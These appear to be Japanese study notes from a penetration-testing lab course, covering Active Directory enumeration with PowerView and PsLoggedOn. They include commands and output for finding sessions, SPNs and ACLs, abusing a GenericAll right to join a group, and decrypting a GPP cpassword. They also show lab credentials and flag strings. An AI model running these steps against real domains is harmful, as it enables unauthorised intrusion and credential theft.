```bash
Import-Module .\PowerView.ps1 # PowerShellでモジュールをロード、エラーが発生した場合は実行ポリシーを変更
Get-NetDomain # ドメインの基本情報を取得
Get-NetUser # ドメイン内のすべてのユーザーをリスト
```
- 上記コマンドの出力は、`select`コマンドを使用してフィルタリングできます。たとえば、`Get-NetUser | select cn`のように、`cn`は出力のサブヘッダーです。

```markdown
Get-NetGroup # ドメイングループを列挙
Get-NetGroup "group name" # 特定グループの情報を取得
Get-NetComputer # ドメイン内のコンピュータオブジェクトを列挙
Find-LocalAdminAccess # 現在のユーザーがドメイン内の任意のコンピュータに管理者権限を持っているかどうかをスキャン
Get-NetSession -ComputerName files04 -Verbose # Get-NetSessionでログオン中のユーザーを確認、詳細情報を追加
Get-NetUser -SPN | select samaccountname,serviceprincipalname # ドメイン内のSPNアカウントをリスト
Get-ObjectAcl -Identity <user> # ACE(アクセス制御エンティティ)を列挙し、SID(セキュリティ識別子)をリスト
Convert-SidToName <sid/objsid> # SID/ObjSIDを名前に変換

# 特定グループに対する「GenericAll」権限をチェック。取得後、convert-sidtonameを使用して変換可能
Get-ObjectAcl -Identity "group-name" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

Find-DomainShare # ドメイン内の共有を検索

Get-DomainUser -PreauthNotRequired -verbose # AS-REP Roastingの対象となるアカウントを特定

Get-NetUser -SPN | select serviceprincipalname # Kerberoastingの対象となるアカウント
---
```

---
# PowerView.ps1を利用した応用列挙
```table-of-contents
```
# 応用列挙
## OSの列挙
PowerViewを使用

### ドメイン内のコンピューター オブジェクトを列挙
```powershell
Get-NetComputer

#オペレーティングシステムとホスト名を検索。出力を selectにパイプしてリストを整理
Get-NetComputer | select operatingsystem,dnshostname

operatingsystem              dnshostname
---------------              -----------
Windows Server 2022 Standard DC1.corp.com
Windows Server 2022 Standard web04.corp.com
Windows Server 2022 Standard FILES04.corp.com
Windows 11 Enterprise        client74.corp.com
Windows 11 Enterprise        client75.corp.com
Windows 10 Pro               CLIENT76.corp.com
```
- ドメインに合計 6 台のコンピュータがあり、そのうち 3 台はサーバーであり、そのうち 1 台は DC である
- 評価の早い段階でこの情報を入手し、システムの相対的な古さを把握し、潜在的に脆弱な標的を特定する
- 最も古いOSを搭載したマシンはWindows 10を実行している
- Webサーバーとファイルサーバーにも対処する必要がある
- 評価の早い段階でこの情報を入手し、システムの相対的な古さを把握し、潜在的に脆弱な標的を特定する

### Example
### WEB04 マシンのDistinguishedName
```powershell
Get-NetComputer web04 | select distinguishedname

distinguishedname
-----------------
CN=web04,CN=Computers,DC=corp,DC=com
```

### FILES04 の正確なオペレーティング システムのバージョン
```powershell
Get-NetComputer Files04 | select operatingsystemversion

operatingsystemversion
----------------------
10.0 (20348)
```

### Flag
```powershell
Get-NetComputer | findstr OS

operatingsystem        : OS{f9c846478fdf5cca4e451af625ce56dc}
```
---

## 概要の取得 - 権限とログオンユーザー
- 取得した情報からドメインマップ、NW図を作成する
- ユーザーがドメインにログインすると、その資格情報はログイン元のコンピューターのメモリにキャッシュされる
- 必ずしもすぐにDomain Adminsにエスカレートする必要はない
- サービスアカウントは、特定のサーバーにおけるローカル管理者権限など、通常のドメインユーザーよりも多くの権限を持つ場合がある

```zsh
xfreerdp3 /u:stephanie /p:'LegmanTeamBenzoin!!' /d:corp.com /v:192.168.139.75 /dynamic-resolution
```

### PowerView.ps1
```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

Import-Module .\PowerView.ps1
```

### ネットワークをスキャンして、現在のユーザーがドメイン内のいずれかのコンピュータに対して管理者権限を持っているかどうかを判断
```powershell
Find-LocalAdminAccess
#client74.corp.com
```

### どのユーザーがどのコンピュータにログインしているかなどの情報を取得する
権限がないPCはエラーになる
#### Get-NetSessionの仕組み
- 内部的にNetWkstaUserEnumAPIとNetSessionEnumAPIを使用
##### NetSessionEnum
クエリレベル
- 0 セッションを確立したコンピュータの名前のみ
- 1及び2 より詳細 管理者権限が必要
- 10 コンピュータ名や接続を確立したユーザー名などの情報を返す デフォルト
- 502 コンピュータ名や接続を確立したユーザー名などの情報を返す
レジストリ
- HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurityハイブにある SrvsvcSessionInfoレジストリ キーで定義されている
- デフォルトのWindows 11ではNetSessionEnumがこの種の情報を取得できない
```powershell
Get-NetSession -ComputerName files04

Get-NetSession -ComputerName files04 -Verbose
VERBOSE: [Get-NetSession] Error: Access is denied

Get-NetSession -ComputerName web04

Get-NetSession -ComputerName web04 -Verbose
VERBOSE: [Get-NetSession] Error: Access is denied

Get-NetSession -ComputerName client74
CName        : \\192.168.50.75
UserName     : stephanie
Time         : 8
IdleTime     : 0
ComputerName : client74
```

### 現在ログイン中のマシンの権限の確認
#### Get-Acl
 - -Pathフラグ 定義したオブジェクトの権限を取得
 - FullControlまたは ReadKey のいずれかを持つグループとユーザーが表示されSrvsvcSessionInfoキー自体を読み取ることができることを意味する
```powershell
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
```

### ドメイン内のオペレーティングシステムのバージョンの詳細
```powershell
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
dnshostname       operatingsystem              operatingsystemversion
-----------       ---------------              ----------------------
DC1.corp.com      Windows Server 2022 Standard 10.0 (20348)
web04.corp.com    Windows Server 2022 Standard 10.0 (20348)
FILES04.corp.com  Windows Server 2022 Standard 10.0 (20348)
client74.corp.com Windows 11 Enterprise        10.0 (22000)
client75.corp.com Windows 11 Enterprise        10.0 (22000)
CLIENT76.corp.com Windows 10 Pro               10.0 (16299)
```

---
### PsLoggedOn.exe
### 概要
- HKEY_USERS以下のレジストリキーを列挙し、ログインしているユーザーのセキュリティ識別子（SID）を取得し、それをユーザー名に変換
- NetSessionEnumAPIを使用して、リソース共有経由でコンピューターにログオンしているユーザーを確認
- 関連付けられたキーのスキャンに**Remote Registry service**を使用するという制限があり**、デフォルトでWorkstationでは無効、Serverでは有効となっている
- リソースを節約するために、10分間操作がないとサービスは停止する
- PsLoggedOn で接続すると（ 自動トリガーによって）再び有効になる
#LoggedOn有り
```powershell
PS C:\Tools\PSTools> .\PsLoggedon.exe \\files04
Users logged on locally:
     <unknown time>             CORP\jeff
```
- この場合、jeffがドメインユーザーアカウントでFILES04にログインしていることがわかる

#LoggedOn無し
```powershell
PS C:\Tools\PSTools> .\PsLoggedon.exe \\web04
No one is logged on locally.
```

### 他の端末（例ではclient74）上に現在のユーザが管理者権限を持っているかを調査
```powershell
.\PsLoggedon.exe \\client74

Users logged on locally:
     <unknown time>             CORP\jeffadmin

Users logged on via resource shares:
     10/5/2022 1:33:32 AM       CORP\stephanie
```
---
## サービスプリンシパル名による列挙
- サービスアカウントも、高い権限を持つグループのメンバーである可能性がある。
- システム自体によって起動されるサービスは、サービスアカウントのコンテキストで実行される。つまり、分離されたアプリケーションは、 LocalSystem、 LocalService、 NetworkServiceなどの定義済みのサービス アカウントのセットを使用できる。
- より複雑なアプリケーションの場合、ドメイン ユーザー アカウントを使用して、ドメイン内のリソースへのアクセスを維持しながら、必要なコンテキストを提供できる
- Exchange、MS SQL、インターネット インフォメーション サービス(IIS)などのアプリケーションが AD に統合されると 、サービス プリンシパル名(SPN)と呼ばれる一意のサービス インスタンス識別子によって、 サービスが Active Directory 内の特定のサービス アカウントに関連付けられる。

```bash
xfreerdp3 /u:stephanie /p:'LegmanTeamBenzoin!!' /d:corp.com /v:192.168.121.75 /dynamic-resolution
```

### setspn -L <アカウント名>
- setspn Microsoft が提供している SPN 管理ツール。Kerberos 認証でサービスを一意に識別するために使われます。
- -L 「List」の略で、指定したアカウントに登録されている SPN を表示します。
- iis_service ここでは SPN を確認したいアカウントの SAM アカウント名（たとえば IIS 用のサービスアカウント）。

```powershell
setspn -L iis_service
Registered ServicePrincipalNames for CN=iis_service,CN=Users,DC=corp,DC=com:
        HTTP/web04.corp.com
        HTTP/web04
        HTTP/web04.corp.com:80
```

```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

Import-Module .\PowerView.ps1

Get-NetUser -SPN | select samaccountname,serviceprincipalname
krbtgt         kadmin/changepw
iis_service    {HTTP/web04.corp.com, HTTP/web04, HTTP/web04.corp.com:80}
```

### IPアドレスの特定
```powershell
nslookup.exe web04.corp.com
Name:    web04.corp.com
Address:  192.168.121.72
```

### ブラザアクセス
ログインフォームが見つかる

---
## オブジェクト権限の列挙
- Active Directoryオブジェクトに関連付けられた特定の権限を列挙
- AD内のオブジェクトには、複数のアクセス制御エントリ（ACE）によって一連の権限が適用される場合があります。これらのACEはアクセス制御リスト（ACL） を構成します 。各ACEは、特定のオブジェクトへのアクセスを許可するか拒否するかを定義します。
- 非常に基本的な例として、ドメインユーザーがドメイン共有（これもオブジェクトです）にアクセスしようとしたとします。すると、対象オブジェクト（この場合は共有）はACLに基づく検証チェックを受け、ユーザーが共有へのアクセス許可を持っているかどうかが判断されます。このACL検証には主に2つのステップがあります。共有にアクセスするために、ユーザーはユーザーIDとアクセス許可で構成されるアクセストークンを送信します。対象オブジェクトは、アクセス許可リスト（ACL）と照合してトークンを検証します。ACLによってユーザーの共有へのアクセスが許可された場合、アクセスは許可されます。そうでない場合、要求は拒否されます。

```bash
xfreerdp3 /u:stephanie /p:'LegmanTeamBenzoin!!' /d:corp.com /v:192.168.158.75 /dynamic-resolution
```

### ユーザ名を指定して、どのACEが適用されているかを確認
```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

Import-Module .\PowerView.ps1

Get-ObjectAcl -Identity stephanie
```
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
ActiveDirectoryRights  : ReadProperty
SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-553

### PowerViewのConvert-SidToNameコマンドを使用して、実際のドメインオブジェクト名に変換
```powershell
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
```
CORP\stephanie

```powershell
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
```
CORP\RAS and IAS Servers

---
### Group内でGenericAll権限を持つユーザの調査及び悪用
オブジェクトに対して設定できる最高のアクセス権限は GenericAll
### 
```powershell
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```

### SIDを実際の名前に変換
```powershell
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
```
CORP\Domain Admins
CORP\stephanie
BUILTIN\Account Operators
Local System
CORP\Enterprise Admins
- 通常、一般のドメインユーザーはAD内の他のオブジェクトに対してGenericAll権限を持つべきではないため、これは設定ミスである可能性が高い
### Stephanieの権限を使って自身をこのグループに追加
```powershell
net group "Management Department" stephanie /add /domain
```
The command completed successfully.

### 確認
```powershell
Get-NetGroup "Management Department" | select member
```
{CN=jen,CN=Users,DC=corp,DC=com, CN=stephanie,CN=Users,DC=corp,DC=com}

### 削除
```powershell
net group "Management Department" stephanie /del /domain
```

### 05 ドメイン共有の列挙
- ドメイン共有には、環境に関する重要な情報が含まれていることが多い
- ドメイン内の共有を検索するには、 PowerViewのFind-DomainShare関数を使用
- -CheckShareAccessフラグを追加して、現在アクセス可能な共有のみを表示することもできる
- 共有を検索してリスト表示するまでには数分かかる場合がある
```powershell
Find-DomainShare
```

```powershell
Find-DomainShare -CheckShareAccess
```

```結果
Name           Type Remark                 ComputerName
----           ---- ------                 ------------
ADMIN$   2147483648 Remote Admin           DC1.corp.com
C$       2147483648 Default share          DC1.corp.com
IPC$     2147483651 Remote IPC             DC1.corp.com
NETLOGON          0 Logon server share     DC1.corp.com
SYSVOL            0 Logon server share     DC1.corp.com
ADMIN$   2147483648 Remote Admin           web04.corp.com
backup            0                        web04.corp.com
C$       2147483648 Default share          web04.corp.com
IPC$     2147483651 Remote IPC             web04.corp.com
ADMIN$   2147483648 Remote Admin           FILES04.corp.com
C                 0                        FILES04.corp.com
C$       2147483648 Default share          FILES04.corp.com
docshare          0 Documentation purposes FILES04.corp.com
IPC$     2147483651 Remote IPC             FILES04.corp.com
Tools             0                        FILES04.corp.com
Users             0                        FILES04.corp.com
Windows           0                        FILES04.corp.com
ADMIN$   2147483648 Remote Admin           client74.corp.com
C$       2147483648 Default share          client74.corp.com
IPC$     2147483651 Remote IPC             client74.corp.com
ADMIN$   2147483648 Remote Admin           client75.corp.com
C$       2147483648 Default share          client75.corp.com
IPC$     2147483651 Remote IPC             client75.corp.com
sharing           0                        client75.corp.com
```
- 3つのサーバといくつかのクライアントが確認できる
- ドメインコントローラ自体に存在するファイルやフォルダが含まれる可能性があるSYSVOLに焦点を当てます。
- この共有は通常、さまざまなドメインポリシーやスクリプトに使用されます。
- デフォルトでは、 SYSVOLフォルダはドメインコントローラ上の%SystemRoot%\SYSVOL\Sysvol\domain-nameにマッピングされており、すべてのドメインユーザーがアクセスできます。
### DC上の共有の調査
```powershell
ls \\dc1.corp.com\sysvol\corp.com\
```

```
d-----         9/21/2022   1:11 AM                Policies
```
- 更に調査を勧め、old-policy-backup.xmlというファイルを発見
```powershell
cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
```

```
<?xml version="1.0" encoding="utf-8"?>
<Groups   clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User   clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
          name="Administrator (built-in)"
          image="2"
          changed="2012-05-03 11:45:20"
          uid="{253F4D90-150A-4EFB-BCC8-6E894A9105F7}">
    <Properties
          action="U"
          newName=""
          fullName="admin"
          description="Change local admin"
          cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
          changeLogon="0"
          noChange="0"
          neverExpires="0"
          acctDisabled="0"
          userName="Administrator (built-in)"
          expires="2016-02-10" />
  </User>
</Groups>
```
- ビルトインAdministratorの暗号化されたパスワードを発見
- システム管理者はグループ ポリシー基本設定 (GPP) を通じてローカル ワークステーションのパスワードを変更することが多い。
- Kali Linuxのgpp-decryptというRubyスクリプトを使って、GPPで暗号化された文字列を復号
```bash
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```

```
P@$$w0rd
```

### Fileサーバ上の共有の調査
#### 例１
```powershell
ls \\FILES04\docshare
```
- 調査を進めていき、興味深いファイルを確認する
```
cat \\FILES04\docshare\docs\do-not-share\start-email.txt
```

```
The username I'm sure you already know, but here you have the brand new auto generated password as well: HenchmanPutridBonbon11
```
- パスワードを発見 HenchmanPutridBonbon11
- 必要に応じて、これを利用してパスワード推測やブルートフォース攻撃に使用できる特定の単語リストを作成できることがある
#### 例２
```powershell
ls "\\FILES04.corp.com\Important Files\"
```

```
-a----         8/16/2025   7:16 AM             78 proof.txt
```

```powershell
cat "\\FILES04.corp.com\Important Files\proof.txt"
```

```
OS{fbcc97c02a5da932abd5427dc25ed526}
```
---